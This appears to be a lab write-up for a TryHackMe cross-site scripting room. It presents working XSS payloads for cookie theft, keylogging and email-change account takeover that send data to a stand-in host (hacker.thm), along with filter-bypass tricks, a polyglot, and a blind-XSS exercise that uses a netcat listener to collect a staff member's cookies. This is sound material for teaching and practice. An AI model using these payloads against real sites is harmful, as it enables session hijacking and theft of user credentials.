# Cross-site Scripting

## What is a payload?

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

Here are some examples of XSS intentions.

## Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

`<script>alert('XSS');</script>`

## Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

## Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

## Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

`<script>user.changeEmail('attacker@hacker.thm');</script>`

Now that the email address for the account has changed, the attacker may perform a reset password attack.

## Perfecting your payload

The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.  
  
Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session.  
  
How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use. To Explain this, click the green Start Machine button on the right, and when the machine has loaded, open the below link in a new tab.

The aim for each level will be to execute the JavaScript alert function with the string THM, for example:  
  
`<script>alert('THM');</script>`  
  
### **Level One:**

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/1606a13f7fe891c779fe50ea0302afb8.png)  

If you view the Page Source, You'll see your name reflected in the code:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f371398ba148e07e85b946028e7f6919.png)  

Instead of entering your name, we're instead going to try entering the following JavaScript Payload: `<script>alert('THM');</script>`  
  
Now when you click the enter button, you'll get an alert popup with the string **THM** and the page source will look like the following:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/49444bf865cdc230d9855b53d93745c6.png)  

And then, you'll get a confirmation message that your payload was successful with a link to the next level.  

### **Level Two:**  

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5458bd5bb617b7e00d9aad9579c030b9.png)  

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)  

It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: `"><script>alert('THM');</script>`  

The important part of the payload is the `">` which closes the value parameter and then closes the input tag.  

This now closes the input tag properly and allows the JavaScript payload to run:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/21a6597c0964f08c69ebffbf014a886a.png)  

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### **Level Three:**

You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/48abb43c885cb5bafff22c714e79b53a.png)  

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: `</textarea><script>alert('THM');</script>`  

This turns this:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c3d0d38d23fab0608bc3ca8b9441974c.png)  

Into This:  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/77ce8ffc9465731ab834f02292ec86d1.png)  

The important part of the above payload is `</textarea>`, which causes the textarea element to close so the script will run.  

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.  

### **Level Four:**  

Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/80fd5abe95b63ce52ff0ff9f9f6f6d57.png)  

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload `';alert('THM');//`  which you'll see from the below screenshot will execute your code. The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/17c6b9717f16af910557438017be9c53.png)  

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### **Level Five:**

Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the `<script>alert('THM');</script>` payload, it won't work. When you view the page source, you'll see why.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9bd2142b2bcd4b4cba34e571550294e4.png)  

  
The word `script`  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.  
  
When a word gets removed from a string, there's a helpful trick that you can try.

**Original Payload:**

`<sscriptcript>alert('THM');</sscriptcript>`

**Text to be removed (by the filter):**

`<sscriptcript>alert('THM');</sscriptcript>`

**Final Payload (after passing the filter):**

`<script>alert('THM');</script>`

Try entering the payload `<sscriptcript>alert('THM');</sscriptcript>` and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### **Level Six:**

Similar to level two, where we had to escape from the value attribute of an input tag, we can try `"><script>alert('THM');</script>` , but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png)  

You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.  
  
Let's change our payload to reflect this `/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and you'll see how this will work.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png)  
  
Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.

## **Polyglots:**

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.  

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

## Practical Example (Blind XSS)

Click on the **Customers** tab on the top navigation bar and click the "**Signup here**" link to create an account. Once your account gets set up, click the **Support Tickets** tab, which is the feature we will investigate for weaknesses. 

Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. 

Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/bd30b2541fb8186755110f5ec3e84330.png)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/34e69ee3fce3021fee02a13a680d5d47.png)  

Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:

`</textarea>test`

Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e247f6dd0b2ebe0e4e512b16b41cec05.png)  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/0ad04cf010b889a8adfdba9d24bcb826.png)  

Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:

 `</textarea><script>alert('THM');</script>`  

Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. 

Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.

While using the TryHackMe AttackBox, let's set up a listening server using Netcat:  

```shell
user@machine$ nc -nlvp 9001
```

Now that we've set up the method of receiving the exfiltrated information, let's build the payload.

`</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>`

Let's breakdown the payload:

The `</textarea>` tag closes the textarea field. 

The `<script>`tag opens open an area for us to write JavaScript.

The `fetch()` command makes an HTTP request.

`{URL_OR_IP}` is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.

`?cookie=` is the query string that will contain the victim's cookies.

`btoa()` command base64 encodes the victim's cookies.

`document.cookie` accesses the victim's cookies for the Acme IT Support Website.

`</script>`closes the JavaScript code block.  

Now create another ticket using the above payload, making sure to swap out the `{URL_OR_IP}` variable to your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you'll see the request come through containing the victim's cookies. 

You can now base64 decode this information using a site like [https://www.base64decode.org/](https://www.base64decode.org/), giving you the necessary information to answer the below question.



#web #xss